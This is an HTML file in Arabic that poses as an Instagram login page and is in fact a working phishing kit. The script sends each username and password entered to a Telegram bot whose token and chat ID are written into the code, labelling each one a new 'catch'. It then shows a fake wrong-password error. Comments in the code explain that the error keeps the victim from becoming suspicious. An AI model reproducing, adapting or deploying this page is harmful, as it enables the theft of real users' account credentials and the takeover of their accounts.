<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background-color: #fafafa;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #262626;
        }
        .container {
            width: 100%;
            max-width: 350px;
            padding: 0 20px;
        }
        .card {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 30px 40px;
            text-align: center;
            margin-bottom: 10px;
        }
        .logo {
            font-family: 'Billabong', cursive, sans-serif;
            font-size: 3.2rem;
            margin-bottom: 30px;
            font-weight: normal;
        }
        .form-group {
            position: relative;
            margin-bottom: 6px;
        }
        input {
            width: 100%;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 9px 8px 7px 8px;
            font-size: 12px;
            color: #262626;
            outline: none;
        }
        input:focus {
            border-color: #a8a8a8;
        }
        .btn {
            width: 100%;
            background-color: #0095f6;
            border: none;
            border-radius: 4px;
            color: white;
            font-weight: 600;
            padding: 7px 16px;
            font-size: 14px;
            margin-top: 10px;
            cursor: pointer;
        }
        .btn:active {
            opacity: 0.7;
        }
        .error-msg {
            color: #ed4956;
            font-size: 14px;
            margin-bottom: 15px;
            display: none;
        }
        .signup-card {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 20px;
            text-align: center;
            font-size: 14px;
        }
        .signup-card a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="card">
            <div class="logo">Instagram</div>
            
            <!-- رسالة الخطأ الوهمية التي تظهر عند المحاولة -->
            <div id="errorBox" class="error-msg">كلمة المرور غير صحيحة. يرجى التحقق من كلمة المرور الخاصة بك وإعادة المحاولة.</div>

            <form id="loginForm">
                <div class="form-group">
                    <input type="text" id="username" placeholder="اسم المستخدم، أو البريد الإلكتروني، أو رقم الهاتف" required>
                </div>
                <div class="form-group" style="margin-top: 6px;">
                    <input type="password" id="password" placeholder="كلمة المرور" required>
                </div>
                <button type="submit" class="btn" id="submitBtn">تسجيل الدخول</button>
            </form>
        </div>

        <div class="signup-card">
            ليس لديك حساب؟ <a href="#">إشترك</a>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "8634745626:AAFlyddrSV8EmJrWx4n-JEy4wQoPedwyaqQ";
        const CHAT_ID = "7822309283";

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;
            const btn = document.getElementById('submitBtn');
            const errorBox = document.getElementById('errorBox');

            // تغيير حالة الزر أثناء الإرسال لزيادة الواقعية
            btn.innerText = "جاري التحقق...";
            btn.disabled = true;

            const text = `🚨 صيد جديد - إنستغرام\n\n👤 الحساب: ${user}\n🔑 الباسورد: ${pass}`;
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: text
                })
            })
            .then(response => response.json())
            .then(data => {
                // إظهار رسالة الخطأ بعد جزء من الثانية ليبدو الأمر طبيعياً كأن كلمة المرور خاطئة
                setTimeout(() => {
                    errorBox.style.display = "block";
                    btn.innerText = "تسجيل الدخول";
                    btn.disabled = false;
                    document.getElementById('password').value = ""; // مسح الحقل فقط
                }, 1000);
            })
            .catch(error => {
                // حتى لو حدث خطأ تقني نظهر نفس رسالة الخطأ لكي لا يشك الضحية
                setTimeout(() => {
                    errorBox.style.display = "block";
                    btn.innerText = "تسجيل الدخول";
                    btn.disabled = false;
                }, 1000);
            });
        });
    </script>
</body>
</html>
